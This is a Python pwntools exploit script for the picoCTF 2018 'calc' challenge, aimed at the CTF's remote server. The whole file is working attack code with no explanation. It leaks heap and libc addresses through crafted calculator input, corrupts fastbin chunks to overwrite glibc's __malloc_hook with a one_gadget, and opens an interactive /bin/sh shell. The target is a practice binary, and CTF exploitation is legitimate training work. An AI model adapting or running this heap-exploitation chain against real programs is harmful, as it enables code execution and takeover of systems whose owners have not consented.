from pwn import *

#r = process('./calc')
r = remote('2018shell2.picoctf.com', 64750)

def exec_op(op):
	r.sendafter('>> ', op + '\n')

log.info('Leak heap address.')

exec_op(': f1 7 ' + str(0x0101010101010101) + ' 1 1 1 1 1 1 1 \x00' + p64(0x21)*0x5d + p64(0x240) + p64(0x20))
exec_op('f1')
heap = u64(r.recvuntil('\'\n').split('\'\n')[0].split('Invalid operation \'\x01\x01\x01\x01\x01\x01')[1][:6].ljust(8, '\x00')) - 0x4a0

log.success('Heap @ ' + hex(heap))

log.info('Leak libc address.')

op = ''
op += '= = = = = = = 1 1 1 1 1 ' 
print hex(len(op))
op += '\x00'*(0x18 - len(op))
op += p64(0x21)
op += p64(0x0)
op += p64(heap + 0xf0) #address of free unsorted bin chunk from which its fd pointer points to the main arena.
op += p64(0x0)
op += p64(0x21)
op += p64(0x0)
op += p64(heap + 0x30)
op += p64(0x0)
op += p64(0x21)
op += p64(0x0)
op += p64(heap + 0x50)
op += p64(0x0)
op += p64(0x21)
op += p64(0x0)
op += p64(heap + 0x70)
op += p64(0x0)
op += p64(0x21)
op += p64(0x0)
op += p64(heap + 0x90)
op += p64(0x0)
op += p64(0x71)
op += p64(0x0)
op += p64(heap + 0xb0)
op += p64(0x0)
op += '\x21\x00'

exec_op(op)
r.recvuntil('0\n'*6)
libc = int(r.recvuntil('\n').split('\n')[0]) - 0x3c4b78

log.success('Libc @ ' + hex(libc))

log.info('Use fastbin corruption to overwrite __malloc_hook with a one_gadget to call /bin/sh.')

op = ''
op += '= '
op += ': pwn 6 1 2 3 4 5 6'
op += '\x00'*(0x18 - len(op))
op += p64(0x21)
op += p64(0x0)
op += p64(0x0)
op += p64(0x0)
op += p64(0x21)
op += p64(0x0)
op += p64(heap + 0x30)
op += p64(0x0)
op += p64(0x21)
op += p64(0x0)
op += p64(heap + 0x50)
op += p64(0x0)
op += p64(0x21)
op += p64(0x0)
op += p64(heap + 0x70)
op += p64(0x0)
op += p64(0x21)
op += p64(0x0)
op += p64(heap + 0x90)
op += p64(0x0)
op += p64(0x71)
op += p64(libc + 0x3c4b10 - 0x23)

exec_op(op)

op = ''
op += '= = : t 6 33 0 0 0 0 0'
print hex(len(op))
op += '\x00'*(0x18 - len(op))
op += p64(0x21)
op += p64(0x0)
op += p64(heap + 0xb0)
op += p64(0x0)
op += p64(0x21)
op += p64(0x0)
op += p64(heap + 0xb0)
op += p64(0x0)
op += p64(0x21)
op += p64(0x0)
op += p64(heap + 0x30)
op += p64(0x0)
op += p64(0x21)
op += p64(heap + 0x10)
op += p64(heap + 0x70)
op += p64(0x0)
op += p64(0x21)
op += p64(0x0)
op += p64(heap + 0x90)
op += p64(0x0)
op += p64(0x21)
op += p64(0x0)
op += p64(0x0)
op += p64(0x0)
op += p64(0x241)
op += p64(libc + 0x3c4b78)
op += p64(libc + 0x3c4b78)
op += p64(0x0)
op += p64(0x0)

exec_op(op)

op = ''
op += '= = = ' + str(libc + 0x3c4b10 - 0x13) + ' 1 : ' + 'A'*3 + p64(libc + 0x45390)[:6] + ' ' + str((heap + 0x110) / 0x10)
print hex(len(op))
op += '\x00'*(0x78 - len(op))
op += p64(0x21)
op += p64(heap + 0x10)
op += p64(heap + 0xb0)
op += p64(0x0)
op += p64(0x21)
op += p64(0x0)
op += p64(heap + 0x90)
op += p64(0x0)
op += p64(0x21)
op += p64(0x0)
op += p64(0x0)
op += p64(0x0)
op += p64(0x241)
op += p64(libc + 0x3c4b78)
op += p64(libc + 0x3c4b78)
op += p64(0x0)
op += p64(0x0)
op += '/bin/sh'

pause()

exec_op(op)

r.interactive()
